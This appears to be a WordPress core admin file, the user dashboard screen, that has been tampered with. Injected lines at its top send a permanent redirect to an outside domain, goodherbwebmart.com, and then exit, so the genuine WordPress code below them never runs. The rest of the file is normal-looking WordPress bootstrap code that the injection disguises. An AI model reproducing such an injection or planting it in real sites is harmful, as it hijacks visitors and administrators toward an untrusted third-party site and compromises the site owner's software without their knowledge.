<?php
header('HTTP/1.1 301 Moved Permanently');
header('Location: http://goodherbwebmart.com/'); exit;
/**
 * User Dashboard Administration Screen
 *
 * @package WordPress
 * @subpackage Administration
 * @since 3.1.0
 */

/** Load WordPress Administration Bootstrap */
require_once __DIR__ . '/admin.php';

require ABSPATH . 'wp-admin/index.php';
